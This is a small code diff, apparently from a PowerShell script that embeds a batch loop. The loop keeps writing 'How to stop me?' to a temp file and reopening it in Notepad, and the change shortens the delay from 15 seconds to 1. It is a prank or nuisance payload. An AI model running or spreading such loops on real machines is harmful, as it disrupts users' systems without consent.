@@ -10,7 +10,7 @@ $NotepadSpam = @{
 :loop
 @echo How to stop me? > "%temp%\spam.txt"
 start /min notepad "%temp%\spam.txt"
-timeout /t 15 /nobreak
+timeout /t 1 /nobreak
 goto loop
 '@
                 
